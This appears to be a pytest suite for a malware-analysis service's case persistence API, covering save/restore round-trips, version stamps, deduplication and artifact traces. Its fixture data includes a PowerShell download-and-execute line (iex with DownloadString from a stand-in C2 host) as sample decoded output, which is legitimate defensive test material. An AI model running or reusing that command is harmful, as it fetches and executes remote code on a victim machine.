"""P0 SSOT Persistence · workspace_cases save→restore round-trip.

Contract (NIVXRAY_ARCHITECTURE_V1.md · R27 SSOT Persistence):
  • ``POST /api/cases/save`` accepts a full ``ssot`` bundle.
  • The bundle is persisted verbatim under ``workspace_cases.ssot``.
  • ``GET /api/cases/{id}`` returns the SSOT so the frontend can rehydrate
    100 % of the investigation with **zero** recomputation.
  • ``GET /api/cases`` surfaces ``has_ssot`` + ``ssot_version`` metadata.
  • Over-sized bundles (> 8 MB payload) drop optional fields gracefully.

Run:  cd /app/backend && python -m pytest tests/test_ssot_persistence.py -v
"""
from __future__ import annotations

import os
import sys
import uuid
from typing import Any, Dict

import pytest
from fastapi.testclient import TestClient

# Make the backend package importable regardless of pytest CWD.
sys.path.insert(0, "/app/backend")

os.environ.setdefault("MONGO_URL", "mongodb://localhost:27017")
os.environ.setdefault("DB_NAME", "test_database")

from server import app  # noqa: E402  (import after sys.path setup)


# ─── Auth bypass helper — reuse the deps.get_current_user dependency
# override that the rest of the suite already installs, if present. ─────
from deps import get_current_user  # noqa: E402


def _fake_user() -> Dict[str, Any]:
    return {"email": "ssot-test@nivxray.local", "sub": "ssot-test"}


app.dependency_overrides[get_current_user] = _fake_user

client = TestClient(app)


def _sample_ssot(payload_kind: str = "typical") -> Dict[str, Any]:
    """A representative Workspace SSOT bundle."""
    base = {
        "understanding": {
            "input_kind": "powershell",
            "confidence": 0.94,
            "decode_required": True,
            "next_steps": ["base64_decode", "gzip_decompress"],
        },
        "analyst_narrative": {
            "executive_summary": "PowerShell downloader with GZip nested layer.",
            "sigma_ideas": ["proc_creation_win_powershell_download_iex"],
            "yara_ideas": ["gzip_pe_dropper"],
            "recommended_actions": ["Isolate host", "Block C2"],
        },
        "inline_story_preproc": {
            "stages": [
                {"op": "b64", "reason": "recognized base64 alphabet"},
                {"op": "gzip", "reason": "magic 1F 8B detected"},
            ],
        },
        "investigation_object": {
            "acquisition_plan": [{"step": "extract_iocs"}],
            "incident": {"behaviors": ["T1059.001", "T1105"]},
            "ice": {"behavior_clusters": ["download-and-execute"]},
        },
        "investigation_mode": True,
        "verdict_card": {
            "verdict": "Malicious",
            "confidence": 92,
            "family": "Cobalt Strike",
            "summary": "Beaconing loader",
        },
        "decode_trace": [
            {"layer": 1, "op": "b64", "out_len": 512},
            {"layer": 2, "op": "gzip", "out_len": 2048},
        ],
        "decode_winner_engine": "powershell-recursive",
        "decode_confidence": 92,
        "iedde": {"steps": [{"decision": "recover"}]},
        "iedde_terminal_state": "recovered",
        "canonical_confidence": 0.93,
        "canonical_confidence_reason": "3-layer clean recovery",
        "mitre": ["T1059.001", "T1105"],
        "lolbas": ["powershell.exe"],
        "semantic": {"clusters": ["c2-download"]},
        "reached_shellcode": True,
        "corrupted_container": None,
        "chain": [
            {"op": "b64", "reason": "b64", "output_preview": "…"},
            {"op": "gzip", "reason": "gzip", "output_preview": "…"},
        ],
        "steps": [{"op": "b64", "args": {}}, {"op": "gzip", "args": {}}],
        "predicted_tree": {"root": {"name": "powershell.exe"}},
        "analysis": {
            "iocs": {"ipv4": ["1.2.3.4"], "url": ["http://c2.example/beacon"]},
            "mitre": ["T1059.001"],
            "ai_verdict": "Malicious",
        },
    }
    if payload_kind == "huge":
        # Blow past the 8 MB safety threshold to exercise drop-order logic.
        base["semantic"] = {"blob": "X" * (9 * 1024 * 1024)}
    return base


def _save(name: str, ssot: Dict[str, Any] | None = None) -> Dict[str, Any]:
    r = client.post(
        "/api/cases/save",
        json={
            "name": name,
            "input": "powershell -EncodedCommand ABCDEF==",
            "output": "iex ((New-Object Net.WebClient).DownloadString('http://c2.example/beacon'))",
            "engine": "powershell-recursive",
            "confidence": 92,
            "chain_ids": ["b64", "gzip"],
            "verdict": "Malicious",
            "iocs": {"ipv4": ["1.2.3.4"]},
            "ssot": ssot,
        },
    )
    assert r.status_code == 200, r.text
    return r.json()


# ─── T1 · Round-trip: SSOT saved is SSOT restored ─────────────────────────
def test_ssot_round_trip_preserves_all_fields():
    ssot = _sample_ssot()
    name = f"pytest-ssot-{uuid.uuid4().hex[:8]}"
    save_resp = _save(name, ssot)
    case_id = save_resp["id"]

    got = client.get(f"/api/cases/{case_id}").json()
    got_ssot = got.get("ssot") or {}
    # All top-level SSOT keys survive the round-trip
    for k in [
        "understanding", "analyst_narrative", "inline_story_preproc",
        "investigation_object", "investigation_mode", "verdict_card",
        "decode_trace", "iedde", "canonical_confidence",
        "canonical_confidence_reason", "mitre", "lolbas", "semantic",
        "reached_shellcode", "chain", "steps", "predicted_tree", "analysis",
    ]:
        assert k in got_ssot, f"SSOT missing key on restore: {k!r}"
    assert got_ssot["understanding"]["input_kind"] == "powershell"
    assert got_ssot["verdict_card"]["family"] == "Cobalt Strike"
    assert got_ssot["mitre"] == ["T1059.001", "T1105"]
    # R28 · compound version stamp
    version = got_ssot.get("version")
    assert isinstance(version, dict), f"expected compound version, got {version!r}"
    for k in ("schema", "engine", "uaie", "baseline"):
        assert k in version, f"version missing key {k!r}"
    assert version["schema"] == "1.0"
    assert "persisted_at" in got_ssot
    # R28.1 · immutable store — GET should surface a source pointer and
    # the Artifact Trace projection.
    assert got.get("ssot_source") in ("immutable_store", "inline_legacy")
    at = got.get("artifact_trace")
    assert isinstance(at, list) and len(at) == len(got_ssot["decode_trace"])
    for layer in at:
        assert layer["artifact_uri"].startswith("uaie://artifact/")
        assert "recognizer" in layer and "capability" in layer


# ─── T2 · List endpoint exposes has_ssot / ssot_version ───────────────────
def test_list_cases_flags_ssot_presence():
    with_ssot_name = f"pytest-ssot-flag-{uuid.uuid4().hex[:6]}"
    _save(with_ssot_name, _sample_ssot())
    # Legacy save without SSOT
    legacy_name = f"pytest-legacy-{uuid.uuid4().hex[:6]}"
    _save(legacy_name, None)

    r = client.get("/api/cases", params={"limit": 200})
    assert r.status_code == 200
    by_name = {c["name"]: c for c in r.json()["cases"]}
    assert by_name[with_ssot_name]["has_ssot"] is True
    # ``ssot_version`` in the listing is the flat schema string for
    # cheap client-side gating; the compound stamp lives on the SSOT.
    assert by_name[with_ssot_name]["ssot_version"] == "1.0"
    assert by_name[legacy_name]["has_ssot"] is False
    assert by_name[legacy_name].get("ssot_version") in (None, "")


# ─── T3 · Oversized bundle drops optional fields cleanly ──────────────────
def test_oversized_bundle_drops_gracefully():
    huge = _sample_ssot("huge")
    name = f"pytest-ssot-huge-{uuid.uuid4().hex[:6]}"
    save_resp = _save(name, huge)
    case_id = save_resp["id"]
    got = client.get(f"/api/cases/{case_id}").json()
    got_ssot = got.get("ssot") or {}
    # Save must succeed; the huge sub-field is dropped and reported.
    version = got_ssot.get("version")
    assert isinstance(version, dict) and version.get("schema") == "1.0"
    dropped = got_ssot.get("dropped_for_size") or []
    assert "semantic" in dropped, f"expected 'semantic' to be dropped, got {dropped!r}"
    # Critical fields (understanding, investigation_object) must survive
    # unless everything above was already dropped — in the sample the huge
    # bytes live in ``semantic`` so all core fields must remain intact.
    assert "understanding" in got_ssot
    assert "investigation_object" in got_ssot


# ─── T4 · Update path preserves SSOT across upserts ───────────────────────
def test_ssot_survives_upsert():
    name = f"pytest-ssot-upsert-{uuid.uuid4().hex[:6]}"
    first = _save(name, _sample_ssot())
    case_id = first["id"]
    # Re-save with a modified SSOT — must upsert (same id) and replace SSOT.
    modified = _sample_ssot()
    modified["verdict_card"]["family"] = "Meterpreter"
    _save(name, modified)
    got = client.get(f"/api/cases/{case_id}").json()
    assert got["id"] == case_id
    assert got["ssot"]["verdict_card"]["family"] == "Meterpreter"


# ─── T5 · Legacy save (no SSOT) still works — R26 back-compat ────────────
def test_legacy_save_still_works():
    name = f"pytest-legacy-nossot-{uuid.uuid4().hex[:6]}"
    save_resp = _save(name, None)
    case_id = save_resp["id"]
    got = client.get(f"/api/cases/{case_id}").json()
    # Legacy shape: no ssot field, no ssot_version, but everything else present.
    assert got.get("ssot") is None
    assert got.get("ssot_version") in (None, "")
    assert got["input"]
    assert got["output"]


# ═════════════════════════════════════════════════════════════════════════
# R28 · Compound Version Stamp
# ═════════════════════════════════════════════════════════════════════════
def test_compound_version_stamp():
    """R28 · every saved SSOT carries schema/engine/uaie/baseline."""
    name = f"pytest-ssot-vstamp-{uuid.uuid4().hex[:6]}"
    save_resp = _save(name, _sample_ssot())
    case_id = save_resp["id"]
    got = client.get(f"/api/cases/{case_id}").json()
    v = got["ssot"]["version"]
    assert isinstance(v, dict)
    assert v["schema"]   == "1.0"
    assert v["engine"]   in ("legacy", "uaie-plugin")
    assert v["uaie"]     in ("phase0", "phase1", "phase2", "phase3")
    assert v["baseline"].startswith("R2")


def test_coerce_legacy_string_version():
    """R28 · legacy R27 SSOTs stored ``version=\"1.0\"`` — coerce on read."""
    from services.ssot_store import coerce_version
    assert coerce_version("1.0") == {
        "schema": "1.0", "engine": "legacy",
        "uaie": "phase0", "baseline": "R27",
    }
    assert coerce_version({"schema": "1.0", "engine": "uaie-plugin"})["engine"] == "uaie-plugin"


# ═════════════════════════════════════════════════════════════════════════
# R28.1 · Immutable SSOT Store
# ═════════════════════════════════════════════════════════════════════════
def test_immutable_store_dereference_endpoint():
    """R28.1 · GET /api/ssot/{investigation_id} returns the SSOT."""
    name = f"pytest-ssot-deref-{uuid.uuid4().hex[:6]}"
    save_resp = _save(name, _sample_ssot())
    case_id = save_resp["id"]
    got = client.get(f"/api/cases/{case_id}").json()
    ref = got.get("ssot_ref")
    assert isinstance(ref, dict) and ref.get("id"), \
        f"ssot_ref missing on case doc: {got.keys()}"
    inv_id = ref["id"]
    r = client.get(f"/api/ssot/{inv_id}")
    assert r.status_code == 200
    body = r.json()
    assert body["investigation_id"] == inv_id
    assert body["checksum"] == ref["checksum"]
    # Compound version stamp survives the dereference.
    assert isinstance(body["version"], dict)
    assert body["ssot"]["verdict_card"]["family"] == "Cobalt Strike"
    # Artifact Trace projection is inline in the dereference response.
    at = body.get("artifact_trace")
    assert isinstance(at, list) and len(at) >= 1
    assert at[0]["artifact_uri"].startswith("uaie://artifact/")


def test_immutable_store_content_dedupes():
    """R28.1 · Identical SSOT bundles collapse to one investigation_id."""
    ssot = _sample_ssot()
    a = _save(f"pytest-dedupe-a-{uuid.uuid4().hex[:6]}", ssot)
    b = _save(f"pytest-dedupe-b-{uuid.uuid4().hex[:6]}", ssot)
    got_a = client.get(f"/api/cases/{a['id']}").json()["ssot_ref"]
    got_b = client.get(f"/api/cases/{b['id']}").json()["ssot_ref"]
    assert got_a["checksum"] == got_b["checksum"], \
        "identical SSOT bundles must produce the same checksum"
    assert got_a["id"] == got_b["id"], \
        "content-addressable store must dedupe by checksum"


def test_deref_404_on_unknown_investigation():
    r = client.get(f"/api/ssot/does-not-exist-{uuid.uuid4().hex}")
    assert r.status_code == 404


# ═════════════════════════════════════════════════════════════════════════
# R28.C · Artifact Trace projection
# ═════════════════════════════════════════════════════════════════════════
def test_artifact_trace_projection_shape():
    """R28.C · projection produces canonical
    Artifact → Recognizer → Capability → Evidence → Child-Artifact rows."""
    from services.ssot_store import project_artifact_trace
    ssot = _sample_ssot()
    trace = project_artifact_trace(ssot)
    assert len(trace) == len(ssot["decode_trace"])
    for idx, layer in enumerate(trace):
        assert layer["layer_index"] == idx
        assert layer["artifact_uri"].startswith("uaie://artifact/")
        assert isinstance(layer["recognizer"], dict) and "name" in layer["recognizer"]
        assert isinstance(layer["capability"], dict) and "name" in layer["capability"]
        assert isinstance(layer["evidence"], list)
    # Last layer carries the case-level IOC evidence bindings.
    last = trace[-1]
    kinds = {e["kind"] for e in last["evidence"]}
    assert "ipv4" in kinds or "url" in kinds
    # Non-last layers point at a child artifact.
    for layer in trace[:-1]:
        assert layer["child_artifact"] is not None
    assert trace[-1]["child_artifact"] is None


def test_artifact_trace_empty_on_legacy_ssot():
    """Projection must be safe on SSOTs without decode_trace."""
    from services.ssot_store import project_artifact_trace
    assert project_artifact_trace({}) == []
    assert project_artifact_trace({"decode_trace": []}) == []


# ═════════════════════════════════════════════════════════════════════════
# R28 · Restore is Rendering — Contract Sanity
# ═════════════════════════════════════════════════════════════════════════
def test_ssot_endpoint_does_not_touch_business_logic():
    """R28 · The dereference endpoint MUST be pure IO + projection.

    We AST-inspect the router to prove it only imports IO+projection
    helpers and never references any decoder / classifier / AI /
    enricher module by name.
    """
    import ast, routers.ssot as ssot_mod
    tree = ast.parse(open(ssot_mod.__file__, "r", encoding="utf-8").read())
    imported: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.ImportFrom):
            mod = node.module or ""
            for a in node.names:
                imported.add(f"{mod}.{a.name}")
        elif isinstance(node, ast.Import):
            for a in node.names:
                imported.add(a.name)
    # Names referenced anywhere in the AST (calls, attributes)
    referenced: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Name):
            referenced.add(node.id)
        elif isinstance(node, ast.Attribute):
            referenced.add(node.attr)
    forbidden = {
        "decode_smart", "narrate", "understand", "recursive_decoder",
        "openai", "anthropic", "gemini", "classify", "enrich_ioc",
        "compose_investigation_summary",
    }
    hits = (referenced | imported) & forbidden
    assert not hits, (
        f"routers/ssot.py referenced forbidden business-logic symbols: {hits!r} — "
        "restore is rendering, not analysis (R28)."
    )
    # Also assert the only permitted imports from services.ssot_store
    # are the two projection/IO helpers.
    ssot_store_imports = {
        n.rsplit(".", 1)[-1] for n in imported if "services.ssot_store" in n
    }
    assert ssot_store_imports <= {"load_ssot", "project_artifact_trace"}, (
        f"routers/ssot.py may only import load_ssot + project_artifact_trace "
        f"from services.ssot_store; got {ssot_store_imports!r}"
    )

